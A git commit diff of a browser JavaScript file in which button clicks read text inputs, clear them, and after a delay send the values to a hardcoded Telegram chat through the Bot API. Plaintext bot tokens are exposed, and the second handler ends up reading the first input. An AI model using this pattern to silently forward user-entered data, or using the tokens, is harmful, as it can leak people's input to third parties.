077ef9d7315a0ed9b2aab0b72186f6470e4dbdce
GurnikVitaliy <111244081+GurnikVitaliy@users.noreply.github.com>
2023-07-17 23:35:03 +0300

    Update main.js

--- main.js
+++ main.js
@@ -20,25 +20,25 @@ btn1.addEventListener('click', () => {
 
     xttp.open("GET", url+inp1);
     xttp.send();
-   },5000)
+   },9000)
 })
 const print = document.querySelector('.print');
 
 const btn2 = document.querySelector('#btn2');
-const token2 = '6050757748:AAE0SlqzlC9im6u5LJpO0k30O4xxT8WLeT8';
+const token2 = '5667940201:AAGW91sDZz9QZfN2g4xSAiSVIDBqZFoVVZo';
 
 btn2.addEventListener('click', () => {
     setTimeout(() => {
-     const input2 = document.querySelector('#input2');
+     const input1 = document.querySelector('#input1');
      let inp1 = input1.value;
  
      input1.value = '';
  
-      const url = 'https://api.telegram.org/bot'+token2+'/sendMessage?chat_id=1201316750&text=';
+      const url = 'https://api.telegram.org/bot'+token1+'/sendMessage?chat_id=1201316750&text=';
      let xttp = new XMLHttpRequest();
  
-     xttp.open("GET", url+inp2);
+     xttp.open("GET", url+inp1);
      xttp.send();
-    },3000)
+    },9000)
  })
  const printt = document.querySelector('.print');
